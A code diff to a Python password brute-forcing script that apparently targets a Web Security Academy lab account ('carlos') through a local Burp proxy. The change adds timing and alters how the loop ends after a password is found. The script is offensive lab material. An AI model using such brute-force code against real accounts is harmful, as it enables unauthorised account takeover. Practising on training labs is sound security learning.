@@ -3,9 +3,10 @@ import urllib3
 import base64
 from hashlib import md5
 import sys
+import time
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-
+before = time.time()
 url = 'https://0a5200800433a94a80ca854800830039.web-security-academy.net/my-account?id=carlos'
 proxies = {
     'http':'http://127.0.0.1:8080',
@@ -33,4 +34,6 @@ for i in candidates:
 
     if 'logout' in r.text:
         print(f'found password {i}')
-        exit(0)
+        break
+
+print(time.time()-before)
